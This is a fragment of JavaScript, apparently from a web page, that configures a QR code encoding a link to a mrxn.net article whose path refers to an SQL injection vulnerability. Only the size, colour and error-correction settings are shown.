text: encodeURI("https://mrxn.net/jswz/amttgroup-user-get\_ip-vlanid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 